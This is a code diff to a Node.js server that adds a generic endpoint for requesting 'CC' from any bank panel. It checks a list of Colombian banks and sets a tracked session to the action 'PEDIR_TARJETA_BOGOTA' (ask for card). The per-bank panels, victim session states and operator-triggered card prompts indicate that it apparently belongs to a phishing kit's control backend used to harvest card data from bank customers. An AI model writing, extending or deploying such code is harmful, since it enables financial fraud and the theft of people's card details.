@@ -1418,6 +1418,24 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
+        // 🔥 ENDPOINT GENÉRICO PARA PEDIR CC DESDE CUALQUIER PANEL 🔥
+        const pedirCcMatch = url.match(/^\/([a-z-]+)\/pedir-cc$/);
+        if (req.method === 'POST' && pedirCcMatch) {
+            const bancoKey = pedirCcMatch[1];
+            const validos = bancos[bancoKey] || ['bancolombia','bc','cc-bogota','cc-bucaramanga','vanti','popular','davivienda','bbva','occidente','caja-social','bogota'].includes(bancoKey);
+            if (!validos) { json(res, 404, { ok: false, error: 'Banco no existe' }); return; }
+            try {
+                const { sessionId } = await getBody(req);
+                if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
+                ultimaAccionSesiones.set(sessionId, 'PEDIR_TARJETA_BOGOTA');
+                accionTsSesiones.set(sessionId, Date.now());
+                estadoSesiones.set(sessionId, estadoSesiones.get(sessionId) || 'pendiente');
+                console.log(`[PEDIR-CC] ${bancoKey} | session: ${sessionId}`);
+                json(res, 200, { ok: true, sessionId, accion: 'PEDIR_TARJETA_BOGOTA' });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
+        }
+
         res.writeHead(404);
         res.end('Not found');
   } catch (globalError) {
